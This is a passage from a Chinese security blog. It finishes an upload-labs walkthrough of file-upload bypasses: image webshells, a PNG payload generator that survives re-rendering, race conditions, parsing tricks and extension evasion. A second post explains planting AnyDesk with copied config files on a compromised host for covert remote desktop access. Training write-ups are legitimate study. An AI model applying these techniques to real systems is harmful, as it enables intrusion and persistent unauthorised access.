src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170622977.png" alt="image-20240107170622977"><br>制作图片马<br>在cmd中执行copy 1.jpg &#x2F;b + phpinfo.php &#x2F;b phpinfo.jpg</p><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170643135.png" alt="image-20240107170643135"><br>可以利用文件包含<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170706490.png" alt="image-20240107170706490"><br>成功解析了</p><p><strong>Pass-14</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> isImage(<span class="hljs-variable">$filename</span>)&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = getimagesize(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable">$ext</span> = image_type_to_extension(<span class="hljs-variable">$info</span>[2]);<br>        <span class="hljs-keyword">if</span>(stripos(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=0)&#123;<br>            <span class="hljs-built_in">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>其实就是多了对文件类型的判断，getimagesize() 函数用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>绕过方式和Pass-13一样</p><p><strong>Pass-15</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">function</span> isImage(<span class="hljs-variable">$filename</span>)&#123;<br>    //需要开启php_exif模块<br>    <span class="hljs-variable">$image_type</span> = exif_imagetype(<span class="hljs-variable">$filename</span>);<br>    switch (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-built_in">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-built_in">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-built_in">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-built_in">break</span>;    <br>        default:<br>            <span class="hljs-built_in">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-built_in">break</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170718700.png" alt="image-20240107170718700"></p><p>exif_imagetype()函数用于判断一个图像的类型<br>所以绕过和Pass-13一样<br><strong>Pass-16</strong><br>是一个文件的二次渲染<br>先参考：<a href="https://xz.aliyun.com/t/2657#toc-3">https://xz.aliyun.com/t/2657#toc-3</a><br>直接利用现成的脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><span class="hljs-variable">$p</span> = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,<br>           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,<br>           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,<br>           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,<br>           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,<br>           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,<br>           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,<br>           0x66, 0x44, 0x50, 0x33);<br><br><br><br><span class="hljs-variable">$img</span> = imagecreatetruecolor(32, 32);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$y</span> = 0; <span class="hljs-variable">$y</span> &lt; sizeof(<span class="hljs-variable">$p</span>); <span class="hljs-variable">$y</span> += 3) &#123;<br>   <span class="hljs-variable">$r</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>];<br>   <span class="hljs-variable">$g</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+1];<br>   <span class="hljs-variable">$b</span> = <span class="hljs-variable">$p</span>[<span class="hljs-variable">$y</span>+2];<br>   <span class="hljs-variable">$color</span> = imagecolorallocate(<span class="hljs-variable">$img</span>, <span class="hljs-variable">$r</span>, <span class="hljs-variable">$g</span>, <span class="hljs-variable">$b</span>);<br>   imagesetpixel(<span class="hljs-variable">$img</span>, round(<span class="hljs-variable">$y</span> / 3), 0, <span class="hljs-variable">$color</span>);<br>&#125;<br><br>imagepng(<span class="hljs-variable">$img</span>,<span class="hljs-string">&#x27;./1.png&#x27;</span>);<br>?&gt;<br></code></pre></td></tr></table></figure><p>运行后用16进制形式打开文件<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170756881.png" alt="image-20240107170756881"><br>将这个文件上传抓包拦截，修改里面的内容，当然也可以直接打开修改在上传<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170805629.png" alt="image-20240107170805629"><br>成功解析了<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170814461.png" alt="image-20240107170814461"></p><p><strong>Pass-17</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_ext</span> = substr(<span class="hljs-variable">$file_name</span>,strrpos(<span class="hljs-variable">$file_name</span>,<span class="hljs-string">&quot;.&quot;</span>)+1);<br>    <span class="hljs-variable">$upload_file</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br><br>    <span class="hljs-keyword">if</span>(move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$upload_file</span>))&#123;<br>        <span class="hljs-keyword">if</span>(in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>             <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span>. rand(10, 99).<span class="hljs-built_in">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br>             rename(<span class="hljs-variable">$upload_file</span>, <span class="hljs-variable">$img_path</span>);<br>             <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>            <span class="hljs-built_in">unlink</span>(<span class="hljs-variable">$upload_file</span>);<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析源码move_uploaded_file($temp_file, $upload_file)会把上传的文件先移到一个临时文件，然后判断文件是否合法了在移动回去。<br>所以需要利用条件竞争删除文件时间差绕过。使用burpsuite<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170827129.png" alt="image-20240107170827129"><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170834890.png" alt="image-20240107170834890"><br>点击Start attack<br>成功访问到<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170844939.png" alt="image-20240107170844939"><br><strong>Pass-18</strong><br>查看源码<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170925844.png" alt="image-20240107170925844"><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107170935053.png" alt="image-20240107170935053"><br>前面有个upload,那我们利用条件竞争绕过访问改名前的文件时得在文件前面也要加个upload<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107171019156.png" alt="image-20240107171019156">7z后缀并不被Apache服务器所识别，却在上传文件名后缀的白名单中，可以利用Apache的解析漏洞将上传的7z后缀文件当做php文件解析<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107171038056.png" alt="image-20240107171038056"><br>成功解析<br><strong>Pass-19</strong><br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107171047076.png" alt="image-20240107171047076"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = array(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-variable">$file_ext</span> = pathinfo(<span class="hljs-variable">$file_name</span>,PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123; <br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>        &#125;<br><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>采用了黑名单的限制，大小写混写可绕过<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107171055855.png" alt="image-20240107171055855"><br><strong>Pass-20</strong><br>查看源码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = null;<br><span class="hljs-keyword">if</span>(!empty(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>]))&#123;<br>    //检查MIME<br>    <span class="hljs-variable">$allow_type</span> = array(<span class="hljs-string">&#x27;image/jpeg&#x27;</span>,<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/gif&#x27;</span>);<br>    <span class="hljs-keyword">if</span>(!in_array(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>],<span class="hljs-variable">$allow_type</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该类型文件!&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        //检查文件名<br>        <span class="hljs-variable">$file</span> = empty(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>]) ? <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>] : <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_name&#x27;</span>];<br>        <span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<br>            <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<br>        &#125;<br><br>        <span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<br>        <span class="hljs-variable">$allow_suffix</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>        <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>)) &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;禁止上传该后缀文件!&quot;</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - 1];<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;/&#x27;</span> .<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传成功！&quot;</span>;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件上传失败！&quot;</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;请选择要上传的文件！&quot;</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>1.首先会对mime进行检测，所以要上传图片的mime<br>2.检查save_name是否为空,如果为空就用文件名赋值给$file,否则用save_name<br>3.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (!is_array(<span class="hljs-variable">$file</span>)) &#123;<br>           <span class="hljs-variable">$file</span> = explode(<span class="hljs-string">&#x27;.&#x27;</span>, strtolower(<span class="hljs-variable">$file</span>));<br>       &#125;<br></code></pre></td></tr></table></figure><p>判断是否为数组，如果不是数据就以”.”拆分为数组<br>4.判断后缀是否是白名单的.jpg、.png、.gif</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$ext</span> = end(<span class="hljs-variable">$file</span>);<br>       <span class="hljs-variable">$allow_suffix</span> = array(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>       <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$ext</span>, <span class="hljs-variable">$allow_suffix</span>))<br></code></pre></td></tr></table></figure><p>5.一切都过了之后就是文件重命名了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$file_name</span> = reset(<span class="hljs-variable">$file</span>) . <span class="hljs-string">&#x27;.&#x27;</span> . <span class="hljs-variable">$file</span>[count(<span class="hljs-variable">$file</span>) - 1];<br></code></pre></td></tr></table></figure><p>取数组第一个为文件名，取数组倒数第二个为文件后缀</p><p>绕过步骤：<br><img src="/2022/06/15/%E6%96%87%E4%BB%B6%E4%B8%8A%E6%AC%A1%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20240107171114545.png" alt="image-20240107171114545"><br>upload&#x2F;upload.php.后面多个.但是windows环境下.会被默认去掉</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>未开启3389实现远程桌面</title>
    <link href="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/"/>
    <url>/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/</url>
    
    <content type="html"><![CDATA[<p>在内网渗透时如果目标没有开启3389，或者通过某种手段给禁用掉了。此时我们就可以通过今天介绍的工具进行远程连接。<br><strong>项目地址</strong><br><a href="https://download.anydesk.com/AnyDesk.exe">https://download.anydesk.com/AnyDesk.exe</a><br>打开应用<br><img src="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20240107165858606.png" alt="image-20240107165858606"><br><img src="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20240107165909402.png" alt="image-20240107165909402"><br>设置连接的用户名和密码</p><p>退出本地的AnyDesk,然后到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">c:\Users\&#123;USER&#125;\AppData\Roaming\AnyDesk    目录下将<br>ad.trace、service.conf、system.conf、user.conf<br>这个<span class="hljs-number">4</span>个文件上传到目标的c:\Users\&#123;目标在线的用户&#125;\AppData\Roaming\AnyDesk目录下。<br></code></pre></td></tr></table></figure><p><img src="/2022/06/15/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/%E6%9C%AA%E5%BC%80%E5%90%AF3389%E5%AE%9E%E7%8E%B0%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2/image-20240107165918098.png" alt="image-20240107165918098"><br>将AnyDesk也上传到目标服务器（任意目录都行，最好修改一下文件名）。然后以在线的那个用户的权限去执行AnyDesk这个程序。最后删除本机的前四个文件配置文件（不删除就相当于有两个一样的地址，就不知道是连接的谁），启动本机的AnyDesk输入一开始你AnyDesk的连接地址，连接成功后输入前面设置的密码即可。<br><img 